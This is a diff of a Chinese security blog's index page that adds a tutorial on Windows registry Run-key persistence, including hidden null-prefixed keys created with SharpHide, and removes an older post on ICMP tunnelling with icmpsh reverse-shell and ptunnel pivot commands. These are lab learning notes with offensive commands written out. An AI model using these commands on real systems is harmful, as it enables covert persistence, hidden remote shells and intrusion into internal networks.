@@ -255,6 +255,127 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">注册表自启动基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-01-06 23:31:46 / 修改时间：23:32:25" itemprop="dateCreated datePublished" datetime="2023-01-06T23:31:46+08:00">2023-01-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="注册表自启动基础"><a href="#注册表自启动基础" class="headerlink" title="注册表自启动基础"></a>注册表自启动基础</h1><p>修改注册表实现开机子启动的方法的好处在于，全版本的windows系统都适用。</p>
+<p>而修改注册表的方法有两种，gui界面和命令行。</p>
+<h1 id="修改注册表的两种方法"><a href="#修改注册表的两种方法" class="headerlink" title="修改注册表的两种方法"></a>修改注册表的两种方法</h1><h2 id="手动修改注册表"><a href="#手动修改注册表" class="headerlink" title="手动修改注册表"></a>手动修改注册表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">首先regedit调用注册表。</span><br><span class="line"></span><br><span class="line">打开注册表之后，找到如下位置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line">以桌面上的1.exe文件为例，在run右侧新建一个字符串值，名字任取，我这里设置为aaa。首先查看1.exe文件的路径：</span><br><span class="line">C:\Users\ASUS\Desktop\1.exe</span><br><span class="line"></span><br><span class="line">然后双击aaa并修改它的值为：</span><br><span class="line">&quot;C:\Users\ASUS\Desktop\1.exe&quot; /start</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106160655173.png" alt="image-20230106160655173"></p>
+<p>(图片虽然是txt，但是是一样的效果)</p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106160722409.png" alt="image-20230106160722409"></p>
+<h2 id="命令行修改注册表"><a href="#命令行修改注册表" class="headerlink" title="命令行修改注册表"></a>命令行修改注册表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过命令行修改注册表的主要方法为用reg命令来改。</span><br><span class="line">可以在命令行输入以下命令查看帮助：</span><br><span class="line">reg /?</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106161009102.png" alt="image-20230106161009102"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们需要用到的一个参数是：</span><br><span class="line">reg add</span><br><span class="line">这表示增加或修改。没有的就增加，已有的就覆盖（名称及类型）。该命令的语法及参数的含义可以在命令行中输入：</span><br></pre></td></tr></table></figure>
+
+<p><code>reg add /?</code></p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106161228642.png" alt="image-20230106161228642"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这里我们需要注意的地方有两个，首先，路径是要被双引号包起来的，其次，双引号后面有一个空格，空格后面才是/`start`参数。</span><br><span class="line">构造语句如下：</span><br><span class="line"></span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bbb /t REG_SZ /d &quot;\&quot;C:\Users\ASUS\Desktop\1.exe\&quot; /start&quot; /f</span><br><span class="line"></span><br><span class="line">注意，/d参数后面的双引号内的全部内容是表示要写入bbb键的内容，而由于该参数会识别双引号，因此这里用了转义。同时，空格也是被包含在双引号内的，因此不必再单独处理。</span><br><span class="line">注意修改注册表最好以管理员身份运行命令提示符，以免出现权限不够的情况。</span><br></pre></td></tr></table></figure>
+
+<h2 id="查询注册表键值"><a href="#查询注册表键值" class="headerlink" title="查询注册表键值"></a>查询注册表键值</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query</span><br><span class="line">用以上命令即可实现。当然如果不知道语法可以通过以下命令进行查询</span><br><span class="line">reg query /?</span><br></pre></td></tr></table></figure>
+
+<p>举个例子，查询刚刚写入的注册表中的键值</p>
+<p><code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v bbb</code></p>
+<h1 id="隐藏注册表的创建"><a href="#隐藏注册表的创建" class="headerlink" title="隐藏注册表的创建"></a>隐藏注册表的创建</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先讲讲，隐藏注册表的原理吧。</p>
+<p>注册表键值名称经过特殊构造： 以”\0”作为开头，后面加上任意字符(不能为数字)</p>
+<p>对于Windows系统，”\0”(即0x0000)会被识别为字符串的结束符，所以在对该字符串读取的过程中，遇到开头的”\0”，会被解析成结束符，提前截断，导致读取错误</p>
+<p>而使用Native API设定注册表，需要使用结构体OBJECT_ATTRIBUTES作为参数， 指定读取的字符串长度</p>
+<p>只要长度设定正常，就能够读取正确的字符串，避免这个bug</p>
+<p>所以，我们可以通过Native API来创建这个特殊的注册表名</p>
+<p>更为重要的是，像regedit.exe和其他对注册表的操作，通常会调用Win32 API，这就导致该注册表无法被读取，也就实现了所谓的”隐藏”</p>
+<p>综上，创建方法为： 通过Native API创建一个以”\0”开头的键值</p>
+<p>[Native API_百度百科 (baidu.com)](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Native">https://baike.baidu.com/item/Native</a> API/5877113?fr=aladdin)</p>
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>实现部分我在网上看都是一些工具的使用，感觉不太行，其中有个工具已经找不到了。然后我问了一下新朋友（chatgpt</p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106171650419.png" alt="image-20230106171650419"></p>
+<p>算是加深了一些印象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当然可以！首先，您可以使用本机API——RegCreateKeyEx来创建一个注册表键。该函数需要提供根键的句柄、以“\\0”开头的字符串作为键的名称以及相应的保护属性，例如访问权限等属性，以及用于指定所创建键的方式的标志。然后，您可以调用函数RegSetValueEx来设置键值，此函数需要您提供要设置的键的句柄，其值的名称以及具体的值，以在Windows注册表中隐藏键值。</span><br></pre></td></tr></table></figure>
+
+<p>随后又问了下手工创建</p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106192024145.png" alt="image-20230106192024145"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">完整步骤如下：</span><br><span class="line"></span><br><span class="line">1. 首先在你想要创建键值的注册表项下，创建一个新的字符串键值；</span><br><span class="line"></span><br><span class="line">2. 使用本机API函数RegSetValueExA()来创建以”\\0”开头的新键值，它的完整代码如下：</span><br><span class="line"></span><br><span class="line">// 函数声明</span><br><span class="line">LONG RegSetValueExA(</span><br><span class="line">HKEY hKey,</span><br><span class="line">LPCSTR lpValueName,</span><br><span class="line">DWORD Reserved,</span><br><span class="line">DWORD dwType,</span><br><span class="line">CONST BYTE *lpData,</span><br><span class="line">DWORD cbData</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// 调用例子</span><br><span class="line">LONG res = RegSetValueExA(hKey, &quot;\\0MyStringKey&quot;, 0, REG_SZ, (const BYTE*)&quot;MyStringValue&quot;, strlen(&quot;MyStringValue&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>(感觉不对呢，仅供参考吧)</p>
+<p>随后我还是找了一个工具，工具的实现原理和上面的一样。但是这个工具需要我们下载下来之后自行编译，链接如下</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/outflanknl/SharpHide">outflanknl/SharpHide: Tool to create hidden registry keys. (github.com)</a></p>
+<p>那么简单介绍一下工具的使用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">若要创建隐藏的注册表（运行）项，请执行以下操作：</span><br><span class="line">SharpHide.exe action=create keyvalue=&quot;C:\Windows\Temp\Bla.exe&quot; </span><br><span class="line"></span><br><span class="line">若要创建带有参数的隐藏注册表（运行）项，请执行以下操作：</span><br><span class="line">SharpHide.exe action=create keyvalue=&quot;C:\Windows\Temp\Bla.exe&quot; arguments=&quot;arg1 arg2&quot;</span><br><span class="line"></span><br><span class="line">删除隐藏的注册表（运行）项：</span><br><span class="line">SharpHide.exe action=delete</span><br></pre></td></tr></table></figure>
+
+<p>开始实践，用命令添加了一个没参数的，</p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106231937737.png" alt="image-20230106231937737"></p>
+<p>现在来看注册表的里面是没有键值的</p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106232344606.png" alt="image-20230106232344606"></p>
+<p>现在重新启动一下，看看是不是成功写入启动项了</p>
+<p><img src="/2023/01/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%9F%BA%E7%A1%80/image-20230106232447518.png" alt="image-20230106232447518"></p>
+<p>成功了！</p>
+<p>最后值得一提的是，该工具也适用于Cobalt Strike的execute-assembly。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freeaihub.com/post/59039.html">execute-assembly实现原理(非托管C++代码调用C#) 狐狸教程 (freeaihub.com)</a></p>
+<p>后续来进行进一步的研究</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/12/31/JAVA%E5%9F%BA%E7%A1%80-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -514,128 +635,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">icmp隧道基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-12-29 20:35:22 / 修改时间：20:35:57" itemprop="dateCreated datePublished" datetime="2022-12-29T20:35:22+08:00">2022-12-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="icmp隧道基础"><a href="#icmp隧道基础" class="headerlink" title="icmp隧道基础"></a>icmp隧道基础</h1><p>ICMP协议既不是基于TCP，也不是基于UDP，而是直接基于网络层的IP协议，在整个网络协议栈中属于相当底层的协议了。用于实现链路连通性测试和链路追踪（我们常用的<code>ping</code>命令就是基于icmp协议实现的）。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
-<h2 id="ICMP报文结构"><a href="#ICMP报文结构" class="headerlink" title="ICMP报文结构"></a>ICMP报文结构</h2><p>下面介绍一下ICMP报文的结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ICMP头部分为三个字段:</span><br><span class="line">type 类型 （0回应，8请求）</span><br><span class="line">code 代码</span><br><span class="line">checksum 校验和</span><br><span class="line"></span><br><span class="line">其余部分三个部分为为:</span><br><span class="line">标识符 ( identifier )，一般填写进程 PID 以区分其他 ping 进程；</span><br><span class="line">报文序号 ( sequence number )，用于编号报文序列；</span><br><span class="line">数据 ( data )，可以是任意数据；</span><br><span class="line"></span><br><span class="line">ICMP协议在实际传输中数据包：20字节IP首部 + 8字节ICMP首部+ 1472字节&lt;数据大小&gt;38字节</span><br><span class="line">ICMP首部细分为8位类型+8位代码+16位校验和+16位标识符+16位序列号</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229120816554-1672317331094.png" alt="image-20221229120816554"></p>
-<h2 id="ICMP隧道原理"><a href="#ICMP隧道原理" class="headerlink" title="ICMP隧道原理"></a>ICMP隧道原理</h2><p>即是把原本其他协议内容通讯，放在<strong>选项数据</strong>位置，从而伪装成一个ICMP进行通信</p>
-<p>值得一提的是，ICMP是控制协议，不需要端口号。</p>
-<h2 id="实践搭建隧道"><a href="#实践搭建隧道" class="headerlink" title="实践搭建隧道"></a>实践搭建隧道</h2><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a><strong>icmpsh</strong></h3><p>icmpsh是一款使用简单，而且不需要管理员权限即可运行的程序，可以较为简答的搭建隧道并同时获得目标shell</p>
-<p>我这里用虚拟机和物理机来进行实验</p>
-<p>这是工具的地址<code>https://github.com/inquisb/icmpsh</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载icmpsh 到本地</span><br><span class="line">git clone https://github.com/inquisb/icmpsh.git #下载工具</span><br><span class="line">apt-get install python-impacket #安装依赖</span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  #关闭本地ICMP应答</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行监听命令，等待回连，IP 192.168.220.146是目标机器</span><br><span class="line">python icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt; </span><br><span class="line">python icmpsh_m.py 192.168.220.129 192.168.220.146</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标机器执行命令格式</span><br><span class="line">icmpsh.exe -t &lt;attacker&#x27;s-IP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
-
-<p> 同时值得注意到是，这个工具是基于python2运行的，python3环境运行的话会报错哦~😅</p>
-<p><strong>You need to install Python Impacket library first问题解决方案：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket/</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
-
-<p>出现下面这种情况说明搭建好了</p>
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229172143069-1672317331094.png" alt="image-20221229172143069"></p>
-<p>但是这里搞忘关掉kali本身的icmp服务了，所以导致流量巨大</p>
-<p>先关了，然后就可以获得一个交互式shell</p>
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229173404402-1672317331094.png" alt="image-20221229173404402"></p>
-<h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>这个工具在kali中也是内置的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">#安装libpcap的依赖环境</span><br><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"></span><br><span class="line">#安装libpcap依赖库</span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">#安装PingTunnel</span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-
-<p>执行是可能的报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error while loading shared libraries: libpcap.so.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
-
-<p>执行一下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis libpcap.so.1a</span><br></pre></td></tr></table></figure>
-
-<p>可以看到文件是存在的,只是系统找不到,做一个连接就好了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/local/lib/libpcap.so.1 /usr/lib/libpcap.so.1</span><br></pre></td></tr></table></figure>
-
-<p>我们搭建以下环境进行实验(好麻烦)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxx 公网vps</span><br><span class="line"></span><br><span class="line">ip2 已经拿下的目标公网服务器（我用kali来代替）</span><br><span class="line"></span><br><span class="line">ip3 无法访问，需要通过隧道才能访问的内网服务器。（虚拟机中的一个win10）</span><br></pre></td></tr></table></figure>
-
-<p>vps 执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p ip2 -lp 3389 -da ip3 -dp 3389 -x cookie</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p  跳板的公网IP</span><br><span class="line">-lp 指定本机的监听端口</span><br><span class="line">-da 目标服务器的内网IP</span><br><span class="line">-dp 指定目标服务器的端口</span><br><span class="line">-x  为隧道写一个隧道密码，防止隧道滥用</span><br></pre></td></tr></table></figure>
-
-<p>你拿下的公网服务器执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x cookie</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203234279-1672317331094.png" alt="image-20221229203234279"></p>
-<p>(上面是攻击机的界面)</p>
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203242870-1672317331094.png" alt="image-20221229203242870"></p>
-<p>（上面是跳板机的界面）</p>
-<p>然后我们访问攻击机的3389端口，即可远程登陆对应目标</p>
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203317920-1672317331094.png" alt="image-20221229203317920"></p>
-<p><img src="/2022/12/29/icmp%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221229203412222-1672317331094.png" alt="image-20221229203412222"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -707,7 +706,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
